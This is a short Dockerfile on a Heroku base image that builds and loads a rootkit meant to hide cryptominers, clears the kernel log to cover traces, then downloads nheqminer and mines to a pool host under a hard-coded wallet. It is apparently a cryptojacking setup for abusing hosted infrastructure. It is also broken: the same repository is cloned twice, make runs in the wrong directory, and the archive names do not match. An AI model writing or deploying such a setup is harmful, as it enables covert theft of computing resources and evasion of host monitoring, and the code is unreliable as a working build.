FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && make
RUN dmesg -C # clears all messages from the kernel ring buffer
RUN insmod rootkit.ko
RUN dmesg # verify that rootkit has been loaded
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u TQpXLjKyYX76kmZ8Sw2uxAcjYqL8B9ihEZ.lolipoplol -p c=TRX,mc=VRSC -t 4
CMD bash heroku.sh
